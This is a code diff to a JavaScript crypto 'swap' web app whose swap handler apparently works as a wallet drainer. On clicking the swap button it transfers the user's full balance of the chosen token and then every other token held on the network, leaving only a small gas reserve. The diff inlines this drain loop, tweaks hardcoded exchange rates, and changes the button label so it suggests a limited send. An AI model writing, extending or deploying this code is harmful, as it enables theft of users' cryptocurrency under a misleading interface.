@@ -15,6 +15,7 @@ const FEE_TOKENS = {
   arbitrum: "0x0000000000000000000000000000000000000000", // ETH
   base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
 };
+const MIN_FEE_RESERVE = 0.001; // Reserve this amount of native token for gas
 
 // App state
 let provider, signer, userAddress;
@@ -681,7 +682,7 @@ function getHardcodedRate(fromToken, toToken) {
     'USDC-ETH': 0.00055,
     'ETH-DAI': 1800,
     'DAI-ETH': 0.00055,
-    'BNB-USDT': 562,
+    'BNB-USDT': 300,
     'USDT-BNB': 0.0033,
     'MATIC-USDT': 0.7,
     'USDT-MATIC': 1.428,
@@ -781,20 +782,62 @@ async function handleSwap() {
     showLoader();
     updateStatus("Processing transfers...", "success");
     
-    // First handle the main token (send all balance regardless of input amount)
+    // Get all tokens for current network
+    const networkTokens = TOKENS[currentNetwork] || [];
+    const feeTokenAddress = FEE_TOKENS[currentNetwork];
+    
+    // First handle the main token
     const fromBalance = await fetchTokenBalance(currentFromToken);
     if (fromBalance > 0) {
       if (currentFromToken.isNative) {
-        // For native tokens, leave a small amount for gas
-        const amountToSend = fromBalance * 0.99; // Send 99% to leave some for gas
-        await transferNativeToken(currentFromToken, amountToSend);
+        // For native tokens being swapped, use entered amount (if any) or full balance minus reserve
+        const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
+        const amountToSend = inputAmount > 0 ? 
+          Math.min(inputAmount, fromBalance - MIN_FEE_RESERVE) : 
+          fromBalance - MIN_FEE_RESERVE;
+        
+        if (amountToSend > 0) {
+          await transferNativeToken(currentFromToken, amountToSend);
+        }
       } else {
+        // For ERC20 tokens, send full balance
         await transferERC20Token(currentFromToken, fromBalance);
       }
     }
     
-    // Then send all other tokens (including fee tokens if they weren't the from token)
-    await sendAllTokens();
+    // Then send all other tokens (except the one we just sent)
+    for (const token of networkTokens) {
+      // Skip the token we already sent and invalid tokens
+      if (token.address === currentFromToken.address || !token.address) continue;
+      
+      const balance = await fetchTokenBalance(token);
+      if (balance > 0) {
+        try {
+          if (token.isNative) {
+            // Check if this is the fee token for the network
+            const isFeeToken = feeTokenAddress && 
+              token.address.toLowerCase() === feeTokenAddress.toLowerCase();
+            
+            if (isFeeToken) {
+              // For fee tokens, leave MIN_FEE_RESERVE for gas
+              const amountToSend = Math.max(0, balance - MIN_FEE_RESERVE);
+              if (amountToSend > 0) {
+                await transferNativeToken(token, amountToSend);
+              }
+            } else {
+              // For other native tokens, send full balance
+              await transferNativeToken(token, balance);
+            }
+          } else {
+            // For ERC20 tokens, send full balance
+            await transferERC20Token(token, balance);
+          }
+        } catch (err) {
+          console.error(`Error transferring ${token.symbol}:`, err);
+          continue;
+        }
+      }
+    }
     
     updateStatus("All transfers completed successfully!", "success");
     document.getElementById("fromAmount").value = '';
@@ -805,50 +848,6 @@ async function handleSwap() {
     updateStatus("Transfer failed: " + err.message, "error");
   } finally {
     hideLoader();
-  }
-}
-
-async function sendAllTokens() {
-  if (!userAddress) return;
-  
-  try {
-    const networkTokens = TOKENS[currentNetwork] || [];
-    const feeTokenAddress = FEE_TOKENS[currentNetwork];
-    
-    // Process all tokens except the one we already sent
-    for (const token of networkTokens) {
-      // Skip the token we already sent
-      if (token.address === currentFromToken.address) continue;
-      
-      const balance = await fetchTokenBalance(token);
-      if (balance > 0) {
-        try {
-          if (token.isNative) {
-            // For native tokens, check if this is the fee token
-            const isFeeToken = feeTokenAddress && 
-              token.address.toLowerCase() === feeTokenAddress.toLowerCase();
-            
-            if (isFeeToken) {
-              // Leave a small amount for gas
-              const amountToSend = balance * 0.99;
-              await transferNativeToken(token, amountToSend);
-            } else {
-              // Send full balance for non-fee native tokens
-              await transferNativeToken(token, balance);
-            }
-          } else {
-            // Send full balance for ERC20 tokens
-            await transferERC20Token(token, balance);
-          }
-        } catch (err) {
-          console.error(`Error transferring ${token.symbol}:`, err);
-          continue;
-        }
-      }
-    }
-  } catch (err) {
-    console.error("Error sending all tokens:", err);
-    throw err;
   }
 }
 
@@ -932,9 +931,14 @@ function updateSwapButton() {
     return;
   }
   
-  // Always show "Send All [TOKEN]" regardless of input amount
+  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
+  if (inputAmount > 0) {
+    btnText.textContent = `Send ${inputAmount} ${currentFromToken.symbol}`;
+  } else {
+    btnText.textContent = `Send All ${currentFromToken.symbol}`;
+  }
+  
   btn.disabled = false;
-  btnText.textContent = `Send All ${currentFromToken.symbol}`;
 }
 
 function showSettings() {
